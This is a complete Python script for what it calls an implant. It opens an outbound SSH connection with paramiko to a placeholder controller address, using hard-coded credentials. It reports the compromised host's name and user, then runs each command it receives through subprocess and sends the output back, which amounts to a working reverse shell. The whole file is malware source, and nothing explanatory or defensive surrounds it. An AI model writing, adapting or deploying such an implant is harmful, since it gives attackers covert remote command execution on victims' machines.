import paramiko
import subprocess
import sys
import os
import shlex
import socket
import getpass

def SSH_comm():
    ip = '<ipaddrhere>'
    port = 2222
    username = 'sshuser'
    password = 'sshpass'
    SSH = paramiko.SSHClient()
    SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    SSH.connect(ip, port=port, username=username, password=password)
    open_SSH_session = SSH.get_transport().open_session()
    h_name = socket.gethostname()
    cur_user = getpass.getuser()
    if open_SSH_session.active:
        open_SSH_session.send(f'Implant checked in from {h_name} as {cur_user}.\n')
        print(open_SSH_session.recv(1024).decode())
        while True:
            command = open_SSH_session.recv(1024)
            try:
                SSH_command = command.decode()
                if SSH_command == 'exit':
                    sys.exit()
                if SSH_command.split(" ")[0] == 'cd':
                    path = SSH_command.split(" ")[1]
                    os.chdir(path)
                    curdir = os.getcwd()
                    #SSH_command_output = subprocess.check_output(shlex.split(SSH_command), stderr=subprocess.STDOUT, shell=True)
                    open_SSH_session.send(f'{curdir}')
                else:
                    SSH_command_output = subprocess.check_output(shlex.split(SSH_command), stderr=subprocess.STDOUT, shell=True)
                    open_SSH_session.send(SSH_command_output)
            except Exception as e:
                open_SSH_session.send(' ')

    return 

if __name__ == '__main__':
    SSH_comm()



